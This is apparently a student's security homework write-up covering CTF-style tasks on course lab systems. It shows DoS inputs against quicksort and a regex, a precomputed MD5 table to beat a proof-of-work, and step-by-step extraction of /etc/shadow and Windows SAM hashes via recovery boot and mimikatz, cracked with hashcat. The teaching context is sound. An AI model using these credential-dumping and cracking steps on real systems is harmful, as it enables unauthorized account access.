---
typora-root-url: pics
---

# NASA HW5

b09902004 郭懷元

# Security



## 2. Proof of Work & DoS 



### 3.

> Refs:
>
> b09902011 陳可邦

Flag: `HW5{c4ts_ar3_a_1ot_cut3r_th4n_柴魚}`

Be reading `server.py`, we know that the flag will be shown if `qsort()` runs slow enough, and the implementation chooses pivot from the middle of the array. Therefore we can construct an input  that forces `qsort()` run in quadratic time. The "evil" input looks something like this: `... 7 5 3 1 2 4 6 ...`

I add the following lines before `interactive(s)` in `example.py`:

```python
case_str = "1"
for i in range(2, 7200):
    if i%2 == 0:
        case_str = case_str+f" {i}"
    else:
        case_str = f"{i} "+case_str
sendLine(s, "1")
print("")
print(recvUntil(s, ': ').decode(), end='')
print("")
sendLine(s, case_str)
print("")
```

Then just run `python example.py`.

---

### 4.

> Refs:
>
> b09902011 陳可邦
> https://medium.com/swlh/exploiting-redos-d610e8ba531

Flag: `HW5{柴魚柴油乾柴烈火火柴砍柴柴米油鹽醬醋茶留得青山在不怕沒柴燒}`

In `server.py`, we can find this regex expression: `^Dear Sophia, (.*柴魚){10,15}.*\. Best wishes, ([a-zA-Z0-9]+ ?)+\.$`. The exploitable part is `([a-zA-Z0-9]+ ?)+`. 

mail: `Dear Sophia, 柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚. Best wishes, 123456789012345678901234567890@.`

---

### 5.

> Refs:
>
> b09902011 陳可邦

Flag: `HW5{y0u_shou1d_w0rk_unt1l_4.am_wi7h_m3_ev3ry_d4y!}`

Certificate: `1757775784||246.7744634760556||08c0f1498914fcbfdb351c61eff3d84e8a6e11d348f51d38ce69c159233f02c6`

Because `proof_of_work()` the random number fed to hash only ranges from 0 to 2^24-1, we can generate a table to use hashed values to lookup prehashed values.

Codes to generate lookup table:

```python
import json, hashlib
rainbow = dict()

for i in range(2**24):
    hashed_i = hashlib.md5(f'{i}'.encode()).hexdigest()[0:8]
    rainbow[hashed_i] = i

jdata = json.dumps(rainbow)
with open('rainbow.json', 'w') as f:
    f.write(jdata)
```

Added lines in `example.py`

```python
with open('rainbow.json') as json_file:
    rainbow = json.load(json_file)
sendLine(s, "3")
for i in range(10):
    task = recvUntil(s, ': ').decode()
    print(task, end='')
    q = task[-12:-4]
    sendLine(s, str(rainbow[q]))
    print(q, str(rainbow[q]))
```



## 4. 弱密碼

### 1.

> Refs:
>
>b09902011 陳可邦
> https://cccharles.pixnet.net/blog/post/326116524
> https://samsclass.info/123/proj10/p12-hashcat.htm

Flag: `HW5{R3al1y_Da_Y1_:P}`

Getting the hash:

1. Plug in the flash drive and connect it to the VM.
2. Select `Advanced Options` and `Ubuntu, with <kernel info> (recovery)`.
3. In recovery menu, choose `root` to drop to shell.
4. `lsblk` to find flash drive's device name, `mount /dev/<device name> /mnt`.
5. `cp /etc/shadow /mnt`, turn off vm.
6. Remove every line except the line with hank, and keep only the hash. Save it as `ubuntu-hash`.

Cracking the password:

```shell
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000000.txt
./hashcat-6.1.0/hashcat.bin -m 1800 -a 0 ubuntu-hash xato-net-10-million-passwords-1000000.txt
```

- `-m 1800`: Cracking linux's hash for passwords.
- `-a 0`: Dictionary mode.
- `ubuntu-hash`: File containing hash.
- `xato-net-10-million-passwords-1000000.txt`: Dictionary file.

The password is `1qaz2wsx3edc4rfv`. The flag in the desktop image of the vm.

![sec-p4-1](/sec-p4-1.png)

![sec-p4-1-2](/sec-p4-1-2.png)

---

### 2.

> Refs:
>
> b09902011 陳可邦
> https://security.stackexchange.com/questions/157922/how-are-windows-10-hashes-stored-if-the-account-is-setup-using-a-microsoft-accou
> https://miloserdov.org/?p=4129
> https://hashcat.net/wiki/doku.php?id=hashcat
> https://windowsreport.com/how-to-enter-recovery-mode-in-windows-10/

Flag: `HW5{Micro$0ft也大意啦}`

**Getting dump file**

1. Plug in a flash drive with windows installation tools. Plug in another for copying files out.
2. Boot with the windows flash drive, enter recovery mode and open command line.
3. `XCOPY /E /I /D /C C:\Windows\System32\config\SAM E:`, `XCOPY /E /I /D /C C:\Windows\System32\config\SYSTEM E:`, turn off VM.

**Getting hash from dump file**

1. Download `mimikatz` from the github repo.
2. In powershell, run `mimikatz.exe`
3. `lsadump::sam /system:<system file copied from vm> /sam:<sam file copied from vm>`
4. In the output text, the hash looks like this:

```
RID  : 000003e8 (1000)
User : howhow
  Hash NTLM: 674ba145222376d43d4f0a9e3f6f315f
```

**Cracking the hash**

Since we are brute forcing, GPU would help a lot. I start with 8-character passwords then increase the length.

```shell
./hashcat-6.1.0/hashcat.bin -I # check available devices
./hashcat-6.1.0/hashcat.bin -m 1000 -a 3 -d 3 windows-hash -1 ?l?d a?1?1?1?1?1?1?1
./hashcat-6.1.0/hashcat.bin -m 1000 -a 3 -d 3 windows-hash -1 ?l?d a?1?1?1?1?1?1?1?1
```

- `-m 1000`: Cracking NTLM hash.
- `-a 3`: Brute force mode.
- `-d 3`: Specifying GPU to use.
- `windows-hash`: File containing hash.
- `-1 ?l?d`: A customize character set that includes lowercase letters and digits.
- `a?1?1?1?1?1?1?1?1`: A mask for brute forcing. An `a` followed by 8 characters from set `1`.

The password is `apple8787`. The flag is the filenames of files on desktop.

![sec-p4-2-1](/sec-p4-2-1.png)

![sec-p4-2-2](/sec-p4-2-2.png)

---





















